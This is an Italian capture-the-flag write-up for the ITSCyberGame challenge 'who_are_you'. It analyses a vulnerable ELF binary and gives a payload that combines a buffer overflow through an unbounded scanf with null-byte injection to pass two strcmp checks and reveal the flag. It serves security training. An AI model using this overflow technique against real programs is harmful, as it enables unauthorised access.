# who_are_you

**Competizione:** ITSCyberGame<br>
**Categoria:** Software<br>
**File:** who_are_you<br>
**Connessione:** `sfide.itscybergame.it:<port_number>`

---

## Descrizione

> Fidarsi è bene, ma non fidarsi è meglio. Sarà dura convincere questo binario a rivelare il suo segreto... per questa sfida dovrai usare telnet o netcat.

Viene fornito un binario ELF 64-bit. Connettendosi al server, il programma chiede il proprio nome e controlla se si è `root`.

---

## Analisi del binario

### Ispezione iniziale

```bash
file who_are_you
strings who_are_you
checksec --file=who_are_you
```

`checksec` rivela:
```
Partial RELRO | No canary | NX enabled | PIE enabled
```

Nessun stack canary, overflow possibile senza protezioni aggiuntive.

Le stringhe più interessanti:

```
USER
Howdy! What's your name?
root
Hi, root! Here's your flag. Please keep it to yourself:
FLAG
Liar! You are not root, you are %s!
Sorry, you must be root to get the flag!
```

Il binario legge la variabile d'ambiente `USER` e quella `FLAG`.

### Disassembly del main

Dal disassembly emerge la logica esatta:

```
strcpy(buf+0x64, getenv("USER"))   ; copia USER a offset +100 nel buffer
puts("Howdy! What's your name?")
scanf("%s", buf)                   ; legge input a offset 0 (NESSUN LIMITE!)
strcmp(buf, "root")                ; confronta nome con "root"
  → se diverso: "Sorry, must be root"
strcmp(buf+0x64, "root")           ; confronta la copia di USER con "root"
  → se diverso: "Liar! You are not root, you are %s!"
  → se uguale:  stampa getenv("FLAG")
```

### Layout dello stack

```
[buf + 0x00]  →  input da scanf  (100 bytes)
[buf + 0x64]  →  copia di USER   (sovrascrivibile!)
```

La distanza tra il buffer di input e la copia di `USER` è esattamente **100 bytes** (`0x64`).

---

## Soluzione

### Il problema

Il primo tentativo ovvio è inviare `root` come nome. Il server però risponde:

```
Liar! You are not root, you are cybergame_contestant!
```

Il binario confronta anche la copia di `USER` (impostata dal server a `cybergame_contestant`), che non possiamo controllare dall'esterno.

Il secondo tentativo è inviare `root` + padding + `root` per sovrascrivere la copia di `USER`. Ma `strcmp(buf, "root")` fallisce perché vede `"rootAAA..."` invece di `"root"`.

### Null byte injection

La soluzione è la **null byte injection**: `strcmp` si ferma al primo byte `\x00`, quindi se inseriamo `\x00` subito dopo `root`, il primo `strcmp` vedrà solo `"root"` e passerà. Il resto del payload continua a scrivere in memoria, sovrascrivendo la copia di `USER` con `"root"`.

Payload:
```
"root" + \x00 + "A"*95 + "root"
  ^              ^          ^
  passa        padding    sovrascrive USER
  strcmp[1]               strcmp[2]
```

### Script (vedi who_are_you.py)

Lo script usato per l'exploit è fornito nella cartella come `who_are_you.py`.
Eseguire lo script con:

```bash
python3 who_are_you.py
```

Assicurati di impostare il valore di `PORT` nel file prima dell'esecuzione.

Output:
```
Hi, root! Here's your flag. Please keep it to yourself:
flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

La vulnerabilità è una combinazione di **buffer overflow** (scanf senza limite di dimensione) e **null byte injection** (inserimento di `\x00` per terminare anticipatamente la stringa). Insieme permettono di superare entrambi i controlli `strcmp`: il primo vede solo `"root\0"` grazie al null byte, il secondo vede `"root"` grazie all'overflow che sovrascrive la copia di `USER` nello stack.